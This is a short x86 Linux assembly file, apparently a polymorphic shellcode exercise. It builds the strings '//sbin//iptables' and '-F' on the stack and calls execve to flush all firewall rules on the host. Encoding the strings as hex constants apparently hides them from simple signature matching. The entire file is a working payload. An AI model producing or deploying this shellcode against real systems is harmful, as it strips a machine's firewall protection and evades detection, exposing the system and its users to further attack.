; Filename: iptables-poly.nasm
; Author: Xavi Beltran
; Date: 05/11/2019


global _start			

section .text
_start:
	xor eax, eax
	push eax
	push word 0x462d
	mov esi, esp
	push eax
	push dword 0x73656c62
	push dword 0x61747069
	mov edi,esp
	push dword 0x2f2f6e69
	push dword 0x62732f2f
	mov ebx, esp
	push eax
	push esi
	push edi
	mov ecx, esp
	mov al, 11
	int 0x80
